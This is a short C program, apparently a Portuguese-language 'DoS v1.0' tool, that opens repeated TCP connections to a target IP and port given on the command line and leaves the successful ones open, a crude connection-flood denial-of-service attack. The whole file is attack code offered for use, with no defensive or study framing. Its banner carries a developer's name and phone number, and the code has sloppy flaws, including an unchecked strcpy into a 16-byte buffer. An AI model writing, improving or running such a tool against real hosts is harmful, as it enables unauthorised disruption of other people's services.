#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>

int main(int argc, char *argv[]){


	if(argc != 4)
	{
		printf("+---------------------------------------------+\n");
		printf("| Franco Informática		 	      |\n");
		printf("| Dev. Luiz G F Michelmann	 	      |\n");
		printf("| +55 19 9 9649 6681		 	      |\n");
		printf("| DoS v1.0			    	      |\n");
		printf("| Modo de uso: ./dos <ip> <porta> <num-atack> |\n");
		printf("+---------------------------------------------+\n");
	}
	else{


	int meusocket;
	int conecta;

	char ip[16];
	strcpy(ip, argv[1]);

	int porta = atoi(argv[2]);
	int atack = atoi(argv[3]);

	for(int i=0;i<atack;i++)
	{
		struct sockaddr_in alvo;

		meusocket = socket(AF_INET, SOCK_STREAM, 0);

		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(porta);
		alvo.sin_addr.s_addr = inet_addr(ip);

		conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

		if(conecta == 0){
			printf("Atacando %s na porta %d\n", ip, porta);
		}
		else{
			printf("Porta Fechada\n");
			close(meusocket);
			close(conecta);
			i=atack;
		}
	}
}
}
